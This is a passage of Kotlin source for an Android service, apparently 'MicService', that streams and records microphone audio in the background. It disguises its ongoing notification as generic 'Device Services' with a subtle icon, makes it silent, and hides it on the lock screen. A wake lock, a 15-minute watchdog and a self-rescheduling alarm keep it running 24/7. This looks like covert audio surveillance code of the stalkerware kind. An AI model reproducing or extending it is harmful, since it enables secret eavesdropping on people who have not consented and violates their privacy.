            put("reason", reason)
            put("ts", lastHealthSentAt)
        }
        ws.send(msg.toString())
    }

    // ────────────────────────────────────────────────────────────────────────
    // File recording helpers
    // ────────────────────────────────────────────────────────────────────────

    private fun openRecordingFile() {
        try {
            val dir = getExternalFilesDir(null) ?: filesDir
            dir.mkdirs()
            val timestamp = System.currentTimeMillis()
            recordingFile = File(dir, "rec_${timestamp}.pcm")
            recordingFileStream = FileOutputStream(recordingFile)
            isSavingFile = true
            Log.i(TAG, "Recording to: ${recordingFile?.absolutePath}")
            updateNotification("Live streaming + Recording…")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open recording file", e)
        }
    }

    private fun closeRecordingFile() {
        isSavingFile = false
        try {
            recordingFileStream?.flush()
            recordingFileStream?.close()
        } catch (_: Exception) {}
        recordingFileStream = null
        Log.i(TAG, "Recording saved: ${recordingFile?.name}")
        updateNotification("Live streaming active")
    }

    // ────────────────────────────────────────────────────────────────────────
    // Notification helpers
    // ────────────────────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        // IMPORTANCE_LOW keeps a visible ongoing service notification, which
        // improves survival on aggressive OEM battery managers.
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Device Services",
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = "Audio streaming service"
            setSound(null, null)
            enableVibration(false)
            setShowBadge(false)
        }
        getSystemService(NotificationManager::class.java)
            .createNotificationChannel(channel)
    }

    private fun buildNotification(statusText: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Device Services")
            .setContentText(statusText)
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)  // subtle icon
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // hidden on lock screen
            .build()
    }

    private fun updateNotification(statusText: String) {
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIF_ID, buildNotification(statusText))
    }

    // ────────────────────────────────────────────────────────────────────────
    // WakeLock — keeps CPU awake while app is in background
    // ────────────────────────────────────────────────────────────────────────

    private fun acquireWakeLock() {
        val pm = getSystemService(PowerManager::class.java)
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "MicMonitor::AudioWakeLock"
        ).also {
            it.setReferenceCounted(false)
            if (!it.isHeld) it.acquire() // Released in onDestroy
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // WorkManager watchdog — keeps service alive 24/7
    // ────────────────────────────────────────────────────────────────────────

    private fun scheduleKeepAlive() {
        val request = PeriodicWorkRequestBuilder<KeepAliveWorker>(15, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
            "keep_alive",
            ExistingPeriodicWorkPolicy.KEEP,
            request
        )
        Log.i(TAG, "KeepAlive watchdog scheduled (15 min interval)")
    }

    /**
     * Schedules a one-shot AlarmManager alarm 8 minutes from now.
     * On fire, sends ACTION_RECONNECT to this service — survives Doze better
     * than coroutines because AlarmManager uses ELAPSED_REALTIME_WAKEUP.
     * The alarm reschedules itself each time it fires, creating a rolling chain.
     */
    private fun scheduleReconnectAlarm() {
        val intent = Intent(applicationContext, MicService::class.java).apply {
            action = ACTION_RECONNECT
        }
        val pendingIntent = PendingIntent.getService(
            applicationContext, 2, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(AlarmManager::class.java)
        val triggerAt = SystemClock.elapsedRealtime() + 8 * 60 * 1000L
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        } else {
            alarmManager.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        }
        Log.i(TAG, "Reconnect alarm scheduled in 8 min")
    }
}
